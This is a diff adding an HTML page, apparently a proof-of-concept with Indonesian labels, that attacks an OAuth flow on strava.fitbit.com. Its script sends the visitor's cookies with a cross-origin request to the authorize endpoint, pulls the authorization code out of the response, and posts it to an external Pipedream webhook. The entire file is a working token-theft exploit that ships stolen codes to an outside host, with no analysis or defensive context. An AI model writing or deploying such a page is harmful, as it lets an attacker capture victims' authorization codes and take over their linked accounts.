@@ -1,0 +1,50 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Ambil kode OAuth dari strava.fitbit.com</title>
+  <style>
+    body { font-family: sans-serif; padding: 20px; }
+    #status { margin-top: 20px; color: green; }
+    #error { margin-top: 20px; color: red; }
+  </style>
+</head>
+<body>
+  <h2>Ambil kode OAuth dari strava.fitbit.com</h2>
+  <div id="status">Sedang memuat...</div>
+  <div id="error"></div>
+
+  <script>
+    const url = "https://strava.fitbit.com/auth/fitbit?client_id=22997K&redirect_uri=https%3A%2F%2Fstrava.fitbit.com%2Fauth%2Ffitbit&response_type=code&scope=profile";
+    const webhook = "https://eoqb3e0qi0vy2sc.m.pipedream.net";
+
+    fetch(url, {
+      method: "GET",
+      credentials: "include",
+      mode: "cors"
+    })
+    .then(response => response.text())
+    .then(text => {
+      // Cari parameter code= di meta refresh
+      const match = text.match(/code=([a-zA-Z0-9\-_]+)/);
+      if (match) {
+        const code = match[1];
+        document.getElementById("status").textContent = "✅ Kode berhasil diambil: " + code;
+
+        // Kirim ke webhook pipedream
+        fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ code: code, source: "github-poc" })
+        });
+      } else {
+        document.getElementById("error").textContent = "Gagal menemukan kode di HTML.";
+      }
+    })
+    .catch(error => {
+      document.getElementById("error").textContent = "ERROR: " + error;
+    });
+  </script>
+</body>
+</html>
+
